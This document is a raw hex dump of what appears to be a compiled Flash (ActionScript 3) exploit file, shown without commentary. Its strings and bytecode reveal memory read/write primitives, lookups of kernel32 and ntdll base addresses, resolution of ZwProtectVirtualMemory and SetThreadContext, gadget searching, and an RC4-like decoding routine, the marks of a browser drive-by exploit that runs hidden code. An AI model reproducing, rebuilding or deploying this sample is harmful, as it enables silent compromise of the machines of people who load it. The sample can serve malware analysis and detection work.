32 39 39 32 65 61 38 63 31 62 30 66 33 38 34 36 		| 2992ea8c1b0f3846 |
63 36 34 38 66 30 61 30 62 32 61 37 66 64 35 32 		| c648f0a0b2a7fd52 |
63 31 35 31 37 66 39 36 61 30 61 33 34 62 35 39 		| c1517f96a0a34b59 |
30 38 39 62 33 34 37 62 35 38 66 39 38 66 63 38 		| 089b347b58f98fc8 |
39 62 35 62 33 38 32 34 63 36 65 36 30 30 36 37 		| 9b5b3824c6e60067 |
35 61 35 30 32 65 61 63 35 30 39 32 64 06 6d 5f 		| 5a502eac5092d*m_ |
6b 65 79 73 34 32 65 62 33 31 66 30 39 65 39 61 		| keys42eb31f09e9a |
37 37 61 30 66 64 65 35 61 31 61 32 33 65 66 66 		| 77a0fde5a1a23eff |
30 36 37 61 32 34 61 39 38 38 34 30 63 65 61 62 		| 067a24a98840ceab |
66 30 34 38 34 39 37 62 33 05 6d 5f 74 72 67 80 		| f048497b3*m_trg* |
04 34 32 65 65 34 62 38 39 32 39 38 36 61 33 32 		| *42ee4b892986a32 |
36 65 61 35 61 61 64 31 30 31 37 39 31 38 61 32 		| 6ea5aad1017918a2 |
33 35 62 30 63 35 65 39 34 30 63 34 34 39 61 39 		| 35b0c5e940c449a9 |
64 34 30 61 35 38 35 63 65 38 66 37 62 39 61 30 		| d40a585ce8f7b9a0 |
61 65 38 62 36 66 34 66 30 61 66 32 38 31 37 30 		| ae8b6f4f0af28170 |
30 62 32 30 36 34 61 36 30 31 35 66 63 30 66 31 		| 0b2064a6015fc0f1 |
36 33 38 39 65 33 62 62 32 38 38 31 63 37 64 38 		| 6389e3bb2881c7d8 |
61 36 36 66 37 39 35 34 38 38 62 33 34 33 33 64 		| a66f795488b3433d |
39 39 38 62 65 38 37 66 37 39 39 32 61 62 62 38 		| 998be87f7992abb8 |
33 33 33 32 39 64 32 65 30 38 36 66 31 33 34 61 		| 33329d2e086f134a |
39 30 38 35 31 30 62 38 32 64 65 63 31 64 62 31 		| 908510b82dec1db1 |
66 38 32 32 64 62 37 62 66 32 35 63 64 32 37 65 		| f822db7bf25cd27e |
39 39 38 33 61 61 66 32 35 38 37 31 38 38 35 39 		| 9983aaf258718859 |
37 61 30 64 63 30 32 64 35 38 30 31 37 61 32 38 		| 7a0dc02d58017a28 |
38 39 39 64 66 61 35 61 36 38 64 36 62 37 37 39 		| 899dfa5a68d6b779 |
37 61 34 66 66 30 30 38 65 39 64 64 65 36 33 31 		| 7a4ff008e9dde631 |
38 36 35 36 39 30 30 36 35 64 34 39 35 38 62 35 		| 865690065d4958b5 |
31 32 30 39 33 33 35 61 35 66 65 34 66 34 66 32 		| 1209335a5fe4f4f2 |
35 61 64 37 34 61 32 31 66 66 37 35 61 34 39 62 		| 5ad74a21ff75a49b |
61 31 64 38 35 63 38 38 33 38 32 62 61 61 61 32 		| a1d85c88382baaa2 |
38 33 65 37 65 62 61 38 31 39 62 33 33 38 36 38 		| 83e7eba819b33868 |
64 33 30 61 30 32 63 37 39 38 33 66 34 31 35 36 		| d30a02c7983f4156 |
36 62 37 35 36 30 65 35 31 65 64 32 34 61 63 63 		| 6b7560e51ed24acc |
36 36 33 63 33 38 61 31 31 36 39 65 63 65 66 65 		| 663c38a1169ecefe |
63 61 36 32 34 38 30 35 34 66 64 63 35 31 65 33 		| ca6248054fdc51e3 |
35 65 30 32 34 66 39 37 61 37 36 37 33 66 34 36 		| 5e024f97a7673f46 |
34 64 39 64 61 30 39 33 63 39 34 63 64 62 32 63 		| 4d9da093c94cdb2c |
38 66 35 33 66 32 65 64 61 61 62 31 66 35 31 61 		| 8f53f2edaab1f51a |
65 36 32 64 38 35 36 30 65 66 36 33 63 38 37 66 		| e62d8560ef63c87f |
36 34 32 62 31 62 31 39 63 66 36 65 37 35 36 34 		| 642b1b19cf6e7564 |
33 39 61 39 64 32 35 66 34 63 30 31 37 66 66 37 		| 39a9d25f4c017ff7 |
63 34 64 62 38 65 37 35 37 62 36 62 65 37 63 36 		| c4db8e757b6be7c6 |
66 04 77 6f 72 6b 05 54 69 6d 65 72 01 73 02 74 		| f*work*Timer*s*t |
66 0a 66 6c 61 73 68 2e 74 65 78 74 09 54 65 78 		| f*flash.text*Tex |
74 46 69 65 6c 64 05 66 6f 75 6e 64 06 6d 5f 6d 		| tField*found*m_m |
61 72 6b 06 72 65 70 65 61 74 08 6d 5f 73 74 61 		| ark*repeat*m_sta |
74 75 73 0d 6d 5f 6c 6f 6e 67 41 72 72 42 61 73 		| tus*m_longArrBas |
65 0c 6d 5f 6c 6f 6e 67 41 72 72 49 64 78 0b 6d 		| e*m_longArrIdx*m |
5f 66 6c 61 73 68 42 61 73 65 0e 6d 5f 66 6c 61 		| _flashBase*m_fla |
73 68 56 69 72 74 75 61 6c 0e 6d 5f 6b 65 72 6e 		| shVirtual*m_kern |
65 6c 33 32 42 61 73 65 0b 6d 5f 6e 74 64 6c 6c 		| el32Base*m_ntdll |
42 61 73 65 0f 6d 5f 5a 77 50 72 6f 74 65 63 74 		| Base*m_ZwProtect |
41 64 64 72 0e 6d 5f 78 63 68 67 49 6e 73 74 41 		| Addr*m_xchgInstA |
64 64 72 12 6d 5f 53 65 74 54 68 72 65 61 64 43 		| ddr*m_SetThreadC |
6f 6e 74 65 78 74 06 6d 5f 69 76 65 72 03 6f 72 		| ontext*m_iver*or |
67 06 76 65 63 74 6f 72 06 6d 5f 6d 79 53 6f 09 		| g*vector*m_mySo* |
66 6c 61 73 68 2e 6e 65 74 0c 53 68 61 72 65 64 		| flash.net*Shared |
4f 62 6a 65 63 74 09 6d 5f 4f 73 74 72 69 6e 67 		| Object*m_Ostring |
08 50 69 64 6a 37 67 62 55 08 6d 5f 72 61 77 4c 		| *Pidj7gbU*m_rawL |
65 6e 05 6d 5f 73 75 66 0a 53 68 61 72 65 4f 62 		| en*m_suf*ShareOb |
6a 45 78 0d 44 65 74 6d 69 6e 65 43 6f 6f 6b 69 		| jEx*DetmineCooki |
65 0b 73 65 74 41 72 72 56 61 6c 75 65 04 66 72 		| e*setArrValue*fr |
65 65 0d 68 65 78 54 6f 49 6e 74 41 72 72 61 79 		| ee*hexToIntArray |
06 64 65 63 6f 64 65 07 6f 75 74 49 6e 66 6f 06 		| *decode*outInfo* |
72 65 61 64 33 32 07 77 72 69 74 65 33 32 05 72 		| read32*write32*r |
65 61 64 38 06 72 65 61 64 31 36 06 77 72 69 74 		| ead8*read16*writ |
65 38 0a 77 72 69 74 65 42 79 74 65 73 12 77 72 		| e8*writeBytes*wr |
69 74 65 55 6e 69 63 6f 64 65 53 74 72 69 6e 67 		| iteUnicodeString |
10 77 72 69 74 65 41 73 63 69 69 53 74 72 69 6e 		| *writeAsciiStrin |
67 0d 61 73 63 69 69 53 74 72 45 71 75 61 6c 0d 		| g*asciiStrEqual* |
67 65 74 4d 6f 64 75 6c 65 42 61 73 65 14 67 65 		| getModuleBase*ge |
74 4d 6f 64 75 6c 65 42 61 73 65 46 72 6f 6d 49 		| tModuleBaseFromI |
41 54 0b 67 65 74 50 72 6f 63 41 64 64 72 0b 73 		| AT*getProcAddr*s |
65 61 72 63 68 42 79 74 65 73 08 68 65 78 54 6f 		| earchBytes*hexTo |
42 69 6e 04 70 72 6f 63 04 44 61 74 65 21 68 74 		| Bin*proc*Date!ht |
74 70 3a 2f 2f 61 64 6f 62 65 2e 63 6f 6d 2f 41 		| tp://adobe.com/A |
53 33 2f 32 30 30 36 2f 62 75 69 6c 74 69 6e 07 		| S3/2006/builtin* |
67 65 74 54 69 6d 65 04 64 61 74 61 06 43 6f 6f 		| getTime*data*Coo |
6b 69 65 0e 66 6c 61 73 68 2e 65 78 74 65 72 6e 		| kie*flash.extern |
61 6c 14 66 6c 61 73 68 2e 64 69 73 70 6c 61 79 		| al*flash.display |
3a 53 70 72 69 74 65 24 66 6c 61 73 68 2e 64 69 		| :Sprite$flash.di |
73 70 6c 61 79 3a 44 69 73 70 6c 61 79 4f 62 6a 		| splay:DisplayObj |
65 63 74 43 6f 6e 74 61 69 6e 65 72 1f 66 6c 61 		| ectContainer*fla |
73 68 2e 64 69 73 70 6c 61 79 3a 49 6e 74 65 72 		| sh.display:Inter |
61 63 74 69 76 65 4f 62 6a 65 63 74 1b 66 6c 61 		| activeObject*fla |
73 68 2e 64 69 73 70 6c 61 79 3a 44 69 73 70 6c 		| sh.display:Displ |
61 79 4f 62 6a 65 63 74 1c 66 6c 61 73 68 2e 65 		| ayObject*flash.e |
76 65 6e 74 73 3a 45 76 65 6e 74 44 69 73 70 61 		| vents:EventDispa |
74 63 68 65 72 07 6e 65 77 44 61 74 65 05 66 6c 		| tcher*newDate*fl |
75 73 68 0e 68 61 73 4f 77 6e 50 72 6f 70 65 72 		| ush*hasOwnProper |
74 79 06 6c 65 6e 67 74 68 11 45 78 74 65 72 6e 		| ty*length*Extern |
61 6c 49 6e 74 65 72 66 61 63 65 02 66 6c 04 63 		| alInterface*fl*c |
61 6c 6c 05 73 74 61 67 65 0a 6c 6f 61 64 65 72 		| all*stage*loader |
49 6e 66 6f 0a 70 61 72 61 6d 65 74 65 72 73 01 		| Info*parameters* |
79 06 6d 79 53 6f 33 32 08 67 65 74 4c 6f 63 61 		| y*mySo32*getLoca |
6c 01 38 01 39 02 31 30 02 31 31 09 61 76 61 69 		| l*8*9*10*11*avai |
6c 61 62 6c 65 03 65 69 6d 08 74 6f 53 74 72 69 		| lable*eim*toStri |
6e 67 05 73 74 61 72 74 05 54 49 4d 45 52 10 61 		| ng*start*TIMER*a |
64 64 45 76 65 6e 74 4c 69 73 74 65 6e 65 72 06 		| ddEventListener* |
63 68 61 72 41 74 08 70 61 72 73 65 49 6e 74 06 		| charAt*parseInt* |
45 6e 64 69 61 6e 0d 4c 49 54 54 4c 45 5f 45 4e 		| Endian*LITTLE_EN |
44 49 41 4e 06 65 6e 64 69 61 6e 09 77 72 69 74 		| DIAN*endian*writ |
65 42 79 74 65 0a 63 68 61 72 43 6f 64 65 41 74 		| eByte*charCodeAt |
0a 77 72 69 74 65 53 68 6f 72 74 0d 77 72 69 74 		| *writeShort*writ |
65 55 54 46 42 79 74 65 73 05 45 72 72 6f 72 01 		| eUTFBytes*Error* |
65 04 73 74 6f 70 0a 65 72 72 6f 72 52 65 70 72 		| e*stop*errorRepr |
6f 1d 63 61 6e 27 74 20 73 65 61 72 63 68 20 74 		| o*can't search t |
68 65 20 6d 6f 64 75 6c 65 20 62 61 73 65 21 08 		| he module base!* |
4b 45 52 4e 45 4c 33 32 05 6e 74 64 6c 6c 16 5a 		| KERNEL32*ntdll*Z |
77 50 72 6f 74 65 63 74 56 69 72 74 75 61 6c 4d 		| wProtectVirtualM |
65 6d 6f 72 79 10 53 65 74 54 68 72 65 61 64 43 		| emory*SetThreadC |
6f 6e 74 65 78 74 3e 36 33 30 65 64 35 34 39 35 		| ontext>630ed5495 |
65 61 61 64 37 63 64 38 62 35 32 64 34 32 62 36 		| eaad7cd8b52d42b6 |
30 66 30 37 35 37 66 31 30 33 35 38 33 32 37 36 		| 0f0757f103583276 |
61 33 31 66 37 63 62 65 65 32 32 30 31 66 64 38 		| a31f7cbee2201fd8 |
30 66 31 36 37 08 77 72 69 74 65 49 6e 74 16 63 		| 0f167*writeInt*c |
62 35 66 62 38 36 64 62 62 61 66 64 37 30 61 64 		| b5fb86dbbafd70ad |
30 34 35 30 34 0f 45 76 65 6e 74 44 69 73 70 61 		| 04504*EventDispa |
74 63 68 65 72 0d 44 69 73 70 6c 61 79 4f 62 6a 		| tcher*DisplayObj |
65 63 74 11 49 6e 74 65 72 61 63 74 69 76 65 4f 		| ect*InteractiveO |
62 6a 65 63 74 16 44 69 73 70 6c 61 79 4f 62 6a 		| bject*DisplayObj |
65 63 74 43 6f 6e 74 61 69 6e 65 72 15 16 01 16 		| ectContainer**** |
05 16 09 16 0b 16 0e 18 0d 05 00 16 14 16 20 16 		| ************** * |
33 08 50 05 00 17 01 16 54 1a 0d 1a 55 1a 56 1a 		| 3*P*****T***U*V* |
57 1a 58 1a 59 02 14 07 01 0b 0c 0d 02 05 04 0e 		| W*X*Y*********** |
08 09 03 0a 06 0f 10 11 12 13 14 6e 07 01 02 07 		| ***********n**** |
01 03 07 01 04 07 02 06 07 01 07 1d 04 01 05 07 		| **************** |
01 08 07 03 0a 07 04 0c 07 01 0d 07 05 0f 07 01 		| **************** |
10 07 01 11 1d 04 01 0d 07 07 12 07 07 13 07 08 		| **************** |
15 07 07 16 07 07 18 07 07 1a 07 07 1c 07 03 1d 		| **************** |
07 01 1e 07 01 1f 07 09 21 07 07 22 07 07 23 07 		| ********!**"**#* |
07 24 07 01 25 07 07 26 07 07 27 07 07 28 07 07 		| *$**%**&**'**(** |
29 07 07 2a 07 07 2b 07 07 2c 07 07 2d 07 07 2e 		| )*****+**,**-**. |
07 01 2f 07 01 30 07 01 32 07 0a 34 07 01 35 07 		| **/**0**2**4**5* |
01 37 07 01 38 07 07 39 07 07 3a 07 01 3b 07 01 		| *7**8**9**:**;** |
3c 07 07 3d 07 07 3e 07 01 3f 07 07 40 07 07 41 		| <**=**>**?**@**A |
07 07 42 07 07 43 07 07 44 07 07 45 07 07 46 07 		| **B**C**D**E**F* |
07 47 07 07 48 07 07 49 07 07 4a 07 07 4b 07 07 		| *G**H**I**J**K** |
4c 07 07 4d 07 07 4e 07 01 4f 07 0b 51 07 01 52 		| L**M**N**O**Q**R |
09 53 01 09 5a 01 07 01 5b 07 0b 5c 1b 01 07 01 		| *S**Z***[**\**** |
5d 07 0e 5e 07 01 60 07 01 61 07 01 62 07 01 63 		| ]**^**`**a**b**c |
09 06 01 07 01 66 07 01 6b 07 01 6d 07 01 6e 07 		| *****f**k**m**n* |
01 6f 07 01 70 07 0b 71 07 01 72 07 03 73 07 01 		| *o**p**q**r**s** |
74 07 01 75 07 01 76 07 0b 77 07 01 78 07 01 79 		| t**u**v**w**x**y |
07 01 7a 07 01 7b 09 75 01 09 76 01 07 01 7c 09 		| **z**{*u**v***|* |
5d 01 09 45 01 09 84 01 01 07 04 86 01 07 05 87 		| ]**E************ |
01 07 05 88 01 07 05 89 01 19 00 00 00 00 00 01 		| **************** |
00 00 00 01 00 00 03 02 03 03 03 00 00 00 00 00 		| **************** |
00 00 02 00 00 01 06 07 00 00 01 08 07 00 00 01 		| **************** |
02 07 00 00 01 03 03 00 00 02 02 03 03 00 00 01 		| **************** |
03 03 00 00 01 03 03 00 00 02 02 03 03 00 00 02 		| **************** |
02 03 08 00 00 02 02 03 07 00 00 02 02 03 07 00 		| **************** |
00 02 01 03 07 00 00 01 03 03 00 00 03 03 03 07 		| **************** |
03 00 00 02 03 03 07 00 00 03 03 08 03 03 00 00 		| **************** |
01 08 07 00 00 01 02 09 00 00 00 00 00 00 00 01 		| **************** |
0a 0b 09 06 00 05 32 0c 00 00 0e 00 0f 00 00 03 		| ******2********* |
01 03 10 00 00 11 00 12 00 00 07 17 01 13 00 00 		| **************** |
07 19 01 14 00 00 07 1b 01 15 00 00 16 00 17 00 		| **************** |
00 0e 00 18 00 00 19 00 1a 00 00 01 0a 0a 1b 00 		| **************** |
00 01 0a 0a 1c 00 00 03 02 03 1d 00 00 00 03 03 		| **************** |
1e 00 00 03 03 03 1f 00 00 03 03 03 20 00 00 03 		| ************ *** |
03 03 21 00 00 03 03 03 22 00 00 03 03 03 23 00 		| **!*****"*****#* |
00 03 03 03 24 00 00 03 03 03 25 00 00 03 03 03 		| ****$*****%***** |
26 00 00 03 03 03 27 00 00 07 00 28 00 00 07 31 		| &*****'****(***1 |
01 29 00 00 2a 00 2b 00 00 07 36 01 2c 00 00 00 		| *)****+***6*,*** |
03 03 2d 00 00 00 01 06 2e 01 00 01 2f 01 00 02 		| **-*****.***/*** |
30 01 00 03 31 01 00 04 32 01 00 06 33 01 00 07 		| 0***1***2***3*** |
34 01 00 08 35 01 00 09 36 01 00 0a 37 01 00 0b 		| 4***5***6***7*** |
38 01 00 0c 39 01 00 0d 3a 01 00 0e 3b 01 00 0f 		| 8***9***:***;*** |
3c 01 00 10 3d 01 00 11 3e 01 00 12 3f 01 00 13 		| <***=***>***?*** |
40 01 00 14 41 01 00 15 42 01 00 16 43 01 00 17 		| @***A***B***C*** |
00 00 01 18 01 0a 04 01 00 19 00 01 01 08 09 03 		| **************** |
d0 30 47 00 00 01 02 02 09 0a 26 d0 30 5d 44 4a 		| *0G*******&*0]DJ |
44 00 46 45 00 82 d5 d0 66 29 66 46 d0 66 2b 61 		| D*FE****f)fF*f+a |
47 d0 66 29 66 46 d1 61 48 d0 66 29 4f 49 00 26 		| G*f)fF*aH*f)OI*& |
48 00 00 02 02 01 09 0a 34 d0 30 d0 66 29 66 46 		| H*******4*0*f)fF |
2c 53 46 4a 01 76 2a 12 0c 00 00 29 d0 66 29 66 		| ,SFJ*v*****)*f)f |
46 2c 5a 46 4a 01 76 12 10 00 00 d0 66 29 66 46 		| F,ZFJ*v*****f)fF |
66 47 d0 66 2b 14 02 00 00 26 48 27 48 00 00 03 		| fG*f+****&H'H*** |
06 04 09 0a 6e d0 30 d2 24 02 a8 12 56 00 00 d0 		| ****n*0*$***V*** |
66 17 d1 66 4b d2 24 02 a1 24 04 a3 d3 2d 04 a8 		| f**fK*$**$***-** |
24 10 a5 d0 66 17 d1 66 4b d2 24 02 a1 24 04 a3 		| $***f**fK*$**$** |
66 4b 2d 04 a8 a9 61 4b d0 66 17 d1 66 4b d2 24 		| fK-***aK*f**fK*$ |
02 a0 24 04 a3 d0 66 17 d1 66 4b d2 24 02 a0 24 		| **$***f**fK*$**$ |
04 a3 66 4b 2f 02 a8 d3 2f 02 a8 24 10 a6 a9 61 		| **fK/***/**$***a |
4b 10 0d 00 00 d0 66 17 d1 66 4b d2 24 04 a3 d3 		| K*****f**fK*$*** |
61 4b 47 00 00 04 03 02 09 0a 4d d0 30 24 00 74 		| aKG*******M*0$*t |
d5 10 0c 00 00 09 d0 66 17 d1 20 61 4b d1 91 74 		| *******f** aK**t |
d5 d1 d0 66 2d 15 ec ff ff d0 20 61 17 24 00 74 		| ***f-***** a*$*t |
d5 10 0c 00 00 09 d0 66 0c d1 20 61 4b d1 91 74 		| *******f** aK**t |
d5 d1 d0 66 0c 66 4c 15 ea ff ff d0 20 61 0c 60 		| ***f*fL***** a*` |
4d 2c 5f 20 4f 4e 02 47 00 00 05 05 0e 09 0a af 		| M,_ ON*G******** |
0a d0 30 d0 49 00 d0 60 4f 66 50 66 51 2c 64 66 		| **0*I**`OfPfQ,df |
4b 68 27 d0 5d 19 4a 19 00 68 18 d0 5d 11 4a 11 		| Kh'*]*J**h**]*J* |
00 68 10 d0 60 52 60 0d 53 01 d0 66 2d 42 01 68 		| *h**`R`*S**f-B*h |
17 d0 60 52 60 0d 53 01 24 0c 42 01 68 0c d0 5d 		| **`R`*S*$*B*h**] |
16 d0 66 0f d0 66 1c 4a 16 02 68 15 24 00 82 d5 		| **f**f*J**h*$*** |
24 00 82 d6 24 00 82 d7 2c 01 82 63 04 2c 01 82 		| $***$***,**c*,** |
63 05 25 80 20 24 04 a3 24 02 a1 82 63 06 24 00 		| c*%* $**$***c*$* |
82 63 07 25 80 20 24 04 a3 24 11 a1 82 63 08 2d 		| *c*%* $**$***c*- |
05 24 08 a0 82 63 09 24 00 82 63 0a 24 00 74 63 		| *$***c*$**c*$*tc |
0b 2d 06 74 63 0c 24 00 82 d5 d0 62 06 68 2c d0 		| *-*tc*$****b*h,* |
60 2a 2c 65 46 53 01 68 29 d0 46 2f 00 76 63 0d 		| `*,eFS*h)*F/*vc* |
10 02 04 00 09 d0 66 17 d1 60 52 60 03 53 01 62 		| ******f**`R`*S*b |
06 42 01 61 4b d0 66 27 2c 67 14 01 00 00 47 d0 		| *B*aK*f',g****G* |
66 27 2c 68 14 0d 02 00 d0 66 17 d1 66 4b 24 00 		| f',h*****f**fK$* |
2a 61 4b d0 d1 24 06 62 09 24 10 a0 24 78 a1 4f 		| *aK**$*b*$**$x*O |
30 03 d0 d1 24 06 24 04 a0 62 09 24 50 a0 24 1c 		| 0***$*$**b*$P*$* |
a1 4f 30 03 24 10 82 63 0a d0 d1 62 0a 62 09 24 		| *O0*$**c***b*b*$ |
20 a0 24 2c a1 4f 30 03 d0 d1 62 0a 24 0c a0 62 		|  *$,*O0***b*$**b |
09 24 20 a0 24 2c a1 4f 30 03 24 20 82 63 0a d0 		| *$ *$,*O0*$ *c** |
d1 62 0a 62 09 24 34 a0 4f 30 03 d0 d1 62 0a 24 		| *b*b*$4*O0***b*$ |
04 a0 2d 07 4f 30 03 d0 d1 62 0a 24 10 a0 24 00 		| **-*O0***b*$**$* |
4f 30 03 24 34 82 63 0a d0 d1 62 0a 2d 07 4f 30 		| O0*$4*c***b*-*O0 |
03 d0 d1 62 0a 24 08 a0 2d 07 4f 30 03 24 50 82 		| ***b*$**-*O0*$P* |
63 0a d0 d1 62 0a 62 09 24 50 a0 24 04 a0 24 04 		| c***b*b*$P*$**$* |
a1 4f 30 03 d0 d1 62 0a 24 04 a0 62 09 24 50 a0 		| *O0***b*$**b*$P* |
24 08 a0 25 a8 01 a1 4f 30 03 d0 d1 62 0a 24 08 		| $**%***O0***b*$* |
a0 24 00 4f 30 03 25 80 02 82 63 0a d0 66 17 d1 		| *$*O0*%***c**f** |
66 4b 62 0a 24 04 a0 24 04 a3 62 09 24 08 a0 62 		| fKb*$**$**b*$**b |
0a a0 25 f8 02 a0 61 4b d0 66 17 d1 66 4b 62 0a 		| **%***aK*f**fKb* |
24 08 a0 24 04 a3 24 00 61 4b d0 66 17 d1 66 4b 		| $**$**$*aK*f**fK |
62 0a 24 0c a0 24 04 a3 62 0a 62 09 a0 24 0c a0 		| b*$**$**b*b**$** |
24 0c a0 24 04 a0 61 4b d0 66 17 d1 66 4b 62 0a 		| $**$**aK*f**fKb* |
24 0c a0 24 0c a0 24 04 a3 24 01 61 4b 62 0a 24 		| $**$**$**$*aKb*$ |
0c a0 24 0c a0 24 04 a0 82 63 0a d0 66 17 d1 66 		| **$**$***c**f**f |
4b 62 0a 24 1c a0 24 04 a3 62 09 25 f8 1f a0 24 		| Kb*$**$**b*%***$ |
42 a1 61 4b d0 66 17 d1 66 4b 62 0a 24 24 a0 24 		| B*aK*f**fKb*$$*$ |
04 a3 2f 02 61 4b d0 66 17 d1 66 4b 62 0a 24 30 		| **/*aK*f**fKb*$0 |
a0 24 04 a3 2d 06 61 4b d0 66 17 d1 66 4b 62 0a 		| *$**-*aK*f**fKb* |
24 70 a0 24 04 a3 2d 08 61 4b 25 f8 1f 24 42 a1 		| $p*$**-*aK%**$B* |
82 63 0a d0 d1 62 0a 24 0c a1 2d 09 4f 30 03 d0 		| *c***b*$**-*O0** |
d1 62 0a 24 00 a0 62 09 62 0a a0 24 08 a0 24 20 		| *b*$**b*b**$**$  |
a1 4f 30 03 d0 d1 62 0a 24 08 a0 2f 03 4f 30 03 		| *O0***b*$**/*O0* |
d0 d1 62 0a 24 0c a0 24 0f 4f 30 03 d0 d1 62 0a 		| **b*$**$*O0***b* |
24 20 a0 24 00 4f 30 03 d0 d1 62 0a 24 24 a0 24 		| $ *$*O0***b*$$*$ |
14 a0 24 00 4f 30 03 d0 d1 62 0a 24 3c a0 2f 03 		| **$*O0***b*$<*/* |
4f 30 03 d0 66 17 d1 66 4b 25 fe 07 93 2f 03 61 		| O0**f**fK%***/*a |
4b 10 cd 01 00 d0 66 27 2c 69 14 0c 01 00 d0 d1 		| K*****f',i****** |
24 30 62 09 25 f8 1f a0 25 94 0a a1 25 d8 02 a1 		| $0b*%***%***%*** |
4f 30 03 d0 d1 25 94 01 24 08 a1 2d 0a 4f 30 03 		| O0***%**$**-*O0* |
d0 d1 25 e4 01 24 08 a1 2f 03 4f 30 03 d0 d1 24 		| **%**$**/*O0***$ |
34 25 c0 03 a0 24 00 4f 30 03 25 80 04 74 63 0b 		| 4%***$*O0*%**tc* |
d0 d1 62 0b 62 09 62 0b a0 4f 30 03 d0 d1 62 0b 		| **b*b*b**O0***b* |
24 0c a0 24 01 4f 30 03 d0 d1 62 0b 24 1c a0 62 		| $**$*O0***b*$**b |
09 62 0b a0 25 80 02 a0 4f 30 03 d0 d1 62 0b 24 		| *b**%***O0***b*$ |
24 a0 2d 0b 4f 30 03 d0 d1 62 0b 24 30 a0 24 00 		| $*-*O0***b*$0*$* |
4f 30 03 d0 d1 62 0b 25 98 01 a0 62 09 25 f8 1f 		| O0***b*%***b*%** |
a0 25 94 0a a1 25 d8 02 a1 4f 30 03 62 0b 25 80 		| *%***%***O0*b*%* |
02 a0 74 63 0b d0 d1 62 0b 24 08 a0 2d 0b 4f 30 		| **tc***b*$**-*O0 |
03 d0 d1 62 0b 24 0c a0 62 0c 4f 30 03 d0 d1 62 		| ***b*$**b*O0***b |
0b 24 24 a0 24 40 4f 30 03 d0 d1 62 0b 24 38 a0 		| *$$*$@O0***b*$8* |
62 09 62 0b a0 24 0c a0 4f 30 03 d0 d1 62 0b 24 		| b*b**$**O0***b*$ |
44 a0 2f 03 4f 30 03 d0 d1 62 0b 24 5c a0 62 0c 		| D*/*O0***b*$\*b* |
4f 30 03 d0 d1 24 34 25 90 1d a0 24 00 4f 30 03 		| O0***$4%***$*O0* |
25 f8 1f 74 63 0b 10 b8 00 00 d0 66 27 2c 6a 14 		| %**tc******f',j* |
af 00 00 d0 d1 24 30 62 09 25 f8 1f a0 25 b8 0c 		| *****$0b*%***%** |
a1 25 c8 04 a1 4f 30 03 d0 d1 25 b8 02 24 08 a1 		| *%***O0***%**$** |
2d 0a 4f 30 03 d0 d1 25 ac 03 24 08 a1 2f 03 4f 		| -*O0***%**$**/*O |
30 03 d0 d1 25 ac 03 24 0c a0 24 08 a1 2f 03 4f 		| 0***%**$**$**/*O |
30 03 25 80 04 74 63 0b d0 d1 62 0b 62 09 62 0b 		| 0*%**tc***b*b*b* |
a0 4f 30 03 d0 d1 62 0b 24 0c a0 24 01 4f 30 03 		| *O0***b*$**$*O0* |
d0 d1 62 0b 24 1c a0 62 09 62 0b a0 25 80 02 a0 		| **b*$**b*b**%*** |
4f 30 03 d0 d1 62 0b 24 24 a0 24 00 4f 30 03 62 		| O0***b*$$*$*O0*b |
0b 25 80 02 a0 74 63 0b d0 d1 62 0b 24 08 a0 2d 		| *%***tc***b*$**- |
0b 4f 30 03 d0 d1 62 0b 24 44 a0 2f 03 4f 30 03 		| *O0***b*$D*/*O0* |
d0 d1 62 0b 24 5c a0 62 0c 4f 30 03 25 f8 1f 74 		| **b*$\*b*O0*%**t |
63 0b d1 91 82 d5 d1 d0 66 2d 15 f6 fb ff 24 00 		| c*******f-****$* |
82 d5 10 35 00 00 09 d0 66 0c d1 60 52 60 0d 53 		| ***5****f**`R`*S |
01 62 08 42 01 61 4b 24 00 82 d6 10 11 00 00 09 		| *b*B*aK$******** |
d0 66 0c d1 66 4b d2 d0 66 10 61 4b d2 91 82 d6 		| *f**fK**f*aK**** |
d2 62 08 15 e8 ff ff d1 91 82 d5 d1 25 80 08 15 		| *b**********%*** |
c3 ff ff 60 4d 66 54 12 11 00 00 60 4d 2c 6c d0 		| ***`MfT****`M,l* |
d0 66 14 46 33 01 46 55 00 4f 4e 02 d0 66 15 4f 		| *f*F3*FU*ON**f*O |
56 00 d0 66 15 60 09 66 57 d0 66 43 4f 58 02 47 		| V**f*`*fW*fCOX*G |
00 00 06 05 07 09 0a 63 d0 30 20 82 d6 d1 66 4c 		| *******c*0 ***fL |
82 d7 24 00 82 63 04 60 52 60 05 53 01 d3 24 02 		| **$**c*`R`*S**$* |
a3 42 01 80 06 63 05 24 00 82 63 06 10 31 00 00 		| *B***c*$**c**1** |
09 d1 62 04 46 59 01 d1 62 04 24 01 a0 46 59 01 		| **b*FY**b*$**FY* |
a0 82 d6 62 05 62 06 5d 5a d2 24 10 46 5a 02 61 		| ***b*b*]Z*$*FZ*a |
4b 62 04 24 02 a0 82 63 04 62 06 24 01 a0 82 63 		| Kb*$***c*b*$***c |
06 62 04 d3 15 c8 ff ff 62 05 48 00 00 07 05 0e 		| *b******b*H***** |
09 0a c9 02 d0 30 24 00 63 06 24 00 63 08 21 82 		| *****0$*c*$*c*!* |
63 09 24 00 63 0d 60 52 60 05 53 01 25 80 02 42 		| c*$*c*`R`*S*%**B |
01 80 06 d6 60 52 60 05 53 01 25 80 02 42 01 80 		| ****`R`*S*%**B** |
06 d7 d0 d0 66 13 46 32 01 80 06 2a 63 04 66 4c 		| ****f*F2****c*fL |
73 63 05 24 00 63 06 10 18 00 00 09 d2 62 06 62 		| sc*$*c*******b*b |
06 61 4b d3 62 06 62 04 62 06 62 05 a4 66 4b 61 		| *aK*b*b*b*b**fKa |
4b c2 06 62 06 25 80 02 15 df ff ff 24 00 63 07 		| K**b*%******$*c* |
24 00 82 63 09 10 34 00 00 09 62 07 d2 62 09 66 		| $**c**4***b**b*f |
4b a0 d3 62 09 66 4b a0 25 ff 01 a8 63 07 d2 62 		| K**b*fK*%***c**b |
09 66 4b 73 63 08 d2 62 09 d2 62 07 66 4b 61 4b 		| *fKsc**b**b*fKaK |
d2 62 07 62 08 61 4b 62 09 91 82 63 09 62 09 25 		| *b*b*aKb***c*b*% |
80 02 15 c3 ff ff 5d 08 4a 08 00 80 08 2a 63 0a 		| ******]*J*****c* |
60 5b 66 5c 61 5d d0 d1 46 32 01 80 06 63 0b 24 		| `[f\a]**F2***c*$ |
00 63 06 24 00 63 0c 24 00 82 63 09 10 60 00 00 		| *c*$*c*$**c**`** |
09 62 06 24 01 a0 25 ff 01 a8 63 06 62 0c d2 62 		| *b*$**%***c*b**b |
06 66 4b a0 25 ff 01 a8 63 0c d2 62 06 66 4b 73 		| *fK*%***c**b*fKs |
